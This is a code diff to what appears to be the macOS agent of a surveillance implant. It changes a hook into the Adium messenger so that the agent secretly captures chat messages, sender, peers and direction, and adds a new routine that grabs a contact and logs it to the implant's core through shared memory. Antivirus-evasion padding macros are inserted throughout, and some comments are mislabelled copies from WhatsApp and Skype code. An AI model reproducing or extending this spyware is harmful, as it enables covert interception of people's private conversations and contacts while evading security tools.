@@ -10,19 +10,127 @@
 
 #import "RCSMInputManager.h"
 #import "RCSMAgentIMAdium.h"
+#import "RCSMAgentOrganizer.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
  
 #import "RCSMAVGarbage.h"
 
-void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSString *_message)
+static BOOL gAdiumContactGrabbed = NO;
+
+void logAdiumContacts(NSString *contact)
 {
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  NSData *firstData   = [@"Adium" dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+  NSData *contactData = [contact dataUsingEncoding:NSUTF16LittleEndianStringEncoding];
+  
+  NSMutableData *abData       = [[NSMutableData alloc] init];
+  
+  u_int tag = 0x1 << 24; // firstName
+  tag |= ([firstData length] & 0x00FFFFFF);
+  
+  [abData appendBytes:&tag length:sizeof(u_int)];
+  
+  [abData appendData:firstData];
+  tag = 0x6 << 24; // email address
+  tag |= ([contactData length] & 0x00FFFFFF);
+  
+  [abData appendBytes:&tag length:sizeof(u_int)];
+  [abData appendData:contactData];
+  
+  NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(organizerAdditionalHeader)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  organizerAdditionalHeader *additionalHeader = (organizerAdditionalHeader *)[logHeader bytes];;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  additionalHeader->size    = sizeof(organizerAdditionalHeader) + [abData length];
+  additionalHeader->version = CONTACT_LOG_VERSION_NEW;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  additionalHeader->identifier  = 0;
+  additionalHeader->program     = 0x07; // whatsapp contact
+  additionalHeader->flags       = 0x80000000; // non local (local = 0x80000000)
+  
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  NSData *processName         = [@"Adium" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
-  NSData *topic               = [_topic dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  NSMutableData *entryData    = [[NSMutableData alloc] init];
+  
+  [entryData appendData:logHeader];
+  [entryData appendData:abData];
+  
+  [logHeader release];
+  [abData release];
+  
+  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+  
+  // Log buffer
+  shMemoryHeader->status          = SHMEM_WRITTEN;
+  shMemoryHeader->agentID         = AGENT_CHAT_CONTACT;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  shMemoryHeader->direction       = D_TO_CORE;
+  shMemoryHeader->commandType     = CM_LOG_DATA;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+  shMemoryHeader->flag            = 0;
+  shMemoryHeader->commandDataSize = [entryData length];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
+  memcpy(shMemoryHeader->commandData,
+         [entryData bytes],
+         [entryData length]);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  [entryData release];
+  
+  if ([mSharedMemoryLogging writeMemory: logData
+                                 offset: 0
+                          fromComponent: COMP_AGENT] == TRUE)
+  {
+#ifdef DEBUG_IM_SKYPE
+    verboseLog(@"message: %@", loggedText);
+#endif
+  }
+  else
+  {
+#ifdef DEBUG_IM_SKYPE
+    errorLog(@"Error while logging skype message to shared memory");
+#endif
+  }
+  
+  [logData release];
+  
+  gAdiumContactGrabbed = TRUE;
+}
+
+void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSString *_message, uint32 flags)
+{
+  int programType = 0x08; // adiumx
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  NSData *topic               = [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
   
   // AV evasion: only on release build
   AV_GARBAGE_004
@@ -40,6 +148,7 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
   AV_GARBAGE_006
   
   shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
+  
   short unicodeNullTerminator = 0x0000;
   
   // AV evasion: only on release build
@@ -82,15 +191,22 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
   // AV evasion: only on release build
   AV_GARBAGE_008
   
-  // Process Name
-  [entryData appendData: processName];
+  // Program type
+  [entryData appendBytes:&programType length:sizeof(programType)];
+  
+  // flags
+  [entryData appendBytes:&flags length:sizeof(flags)];
+    
+  // Topic
+  [entryData appendData: topic];
   
   // AV evasion: only on release build
-  AV_GARBAGE_006
+  AV_GARBAGE_004
   
   [entryData appendBytes: &unicodeNullTerminator
                   length: sizeof(short)];
-  // Topic
+  
+  // Topic_display
   [entryData appendData: topic];
   
   // AV evasion: only on release build
@@ -110,13 +226,15 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
   
   [entryData appendBytes: &unicodeNullTerminator
                   length: sizeof(short)];
-  // Content
-  [entryData appendData: [_sender dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
+  
+  // Peers_display
+  [entryData appendData: peers];
   
   // AV evasion: only on release build
-  AV_GARBAGE_001
+  AV_GARBAGE_000
   
-  [entryData appendData: [@": " dataUsingEncoding: NSUTF16LittleEndianStringEncoding]]; 
+  [entryData appendBytes: &unicodeNullTerminator
+                  length: sizeof(short)];
   
   // AV evasion: only on release build
   AV_GARBAGE_002
@@ -146,7 +264,7 @@ void adiumlogMessage(NSString *_sender, NSString *_topic, NSString *_peers, NSSt
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  shMemoryHeader->agentID         = AGENT_CHAT;
+  shMemoryHeader->agentID         = AGENT_CHAT_NEW;
   shMemoryHeader->direction       = D_TO_CORE;
   
   // AV evasion: only on release build
@@ -292,7 +410,10 @@ void adiumHookWrapper(id arg1, NSUInteger direction)
           // AV evasion: only on release build
           AV_GARBAGE_003
           
-          adiumlogMessage(src, topic, (NSString *)activeMembers, msgBuf);
+          if (gAdiumContactGrabbed == FALSE)
+            logAdiumContacts(src);
+          
+          adiumlogMessage(src, topic, (NSString *)activeMembers, msgBuf, direction);
           
           // AV evasion: only on release build
           AV_GARBAGE_001
